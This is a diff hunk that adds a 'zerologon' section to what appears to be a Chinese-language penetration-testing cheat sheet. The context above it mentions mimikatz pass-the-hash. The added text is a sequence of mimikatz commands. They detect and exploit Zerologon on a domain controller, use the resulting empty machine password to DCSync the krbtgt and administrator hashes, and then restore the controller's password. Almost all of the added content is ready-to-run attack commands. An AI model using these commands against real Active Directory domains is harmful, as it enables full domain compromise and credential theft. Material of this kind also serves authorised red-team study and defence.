@@ -462,3 +462,24 @@ mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c
 ```
 
 域控未打 KB2871997 补丁前，无法使用 Key 传递攻击
+
+---
+
+# zerologon
+
+```bash
+# 检测
+lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$
+
+# 利用
+lsadump::zerologon /target:WIN-A5GPDCPJ7OT.ffffffff0x.com /account:WIN-A5GPDCPJ7OT$ /exploit
+
+# 使用空密码登录域管
+lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:krbtgt /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword:"" /authntlm
+
+# 导出hash
+lsadump::dcsync /domain:ffffffff0x.com /dc:WIN-A5GPDCPJ7OT.ffffffff0x.com /user:administrator /authuser:WIN-A5GPDCPJ7OT$ /authdomain:ffffffff0x /authpassword: /authntlm
+
+# 恢复密码
+lsadump::postzerologon /target:192.168.141.154 /account:WIN-A5GPDCPJ7OT$
+```
